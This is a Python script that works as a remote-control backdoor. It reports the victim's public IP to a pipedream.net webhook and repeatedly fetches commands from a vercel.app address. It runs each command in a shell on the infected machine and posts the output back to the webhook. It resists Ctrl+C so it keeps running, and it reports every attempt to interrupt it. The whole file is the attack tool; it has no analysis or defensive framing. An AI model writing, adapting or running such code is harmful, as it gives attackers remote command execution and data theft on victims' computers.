try:
    from requests import get, post
    from time import sleep
    from subprocess import check_output as system
    from os import chdir

    old_command = ""
    command = ""

    ip = get('https://api.ipify.org').content.decode('utf8')
    post("https://eo482aoknyxae8c.m.pipedream.net", data=f"New client IP: `{ip}`")
except KeyboardInterrupt:
    post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C) when init``")
    pass

while True:
    # prevent keyboardinterrupt
    try:
        #get HTML
        try:
            command = get("https://discord-bot-command-inputter-littleblack111.vercel.app").content.decode()
            if "error" in command.lower():
                sleep(5)
                continue
        except KeyboardInterrupt:
            post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C) with sleeping(cuz of discord api timeout)``")
            continue
        except:
            print("Failed to connect to server")
            sleep(1)
            continue
            # execute command
        if old_command != command:
            try:
                if command.startwith("ping"):
                    try:
                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: Pong!")
                    except KeyboardInterrupt:
                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C) when replying to ping``")
                    except:
                        print("Failed to connect to server")
                        continue
                if command.startwith("cd"):
                    dir=command.replace('cd', '')
                    try:
                        chdir(dir)
                    except KeyboardInterrupt:
                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C) while changing directory``")
                        continue
                    except FileNotFoundError:
                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"``$ {command}`` ```No Such Directory```-{ip}")
                    except:
                        print("Failed to connect to server")
                        continue

                cmdout = system(command, shell=True).decode()
                if cmdout != "":
                    try:
                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"``$ {command}`` ```{cmdout}```-{ip}")
                    except KeyboardInterrupt:
                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C) when trying to post output``")
                        continue
                    except:
                        print("Failed to sent output")
                        continue
                old_command = command
                continue
            except:
                continue
        try:
            sleep(0.1)
        except KeyboardInterrupt:
            post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C)``")
            continue
    except KeyboardInterrupt:
        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C)``")
        continue
